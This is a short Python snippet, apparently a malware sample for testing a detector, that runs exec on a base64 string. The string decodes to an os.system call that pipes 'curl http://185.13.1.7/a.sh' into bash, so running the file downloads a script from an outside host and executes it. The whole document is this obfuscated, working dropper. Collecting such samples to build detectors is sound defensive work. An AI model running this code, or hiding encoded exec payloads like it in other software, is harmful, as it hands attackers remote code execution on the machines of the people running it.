import base64

# Real malware shape: an EMBEDDED literal blob that decodes to a network dropper.
exec(base64.b64decode('aW1wb3J0IG9zCm9zLnN5c3RlbSgiY3VybCBodHRwOi8vMTg1LjEzLjEuNy9hLnNoIHwgYmFzaCIpCg=='))
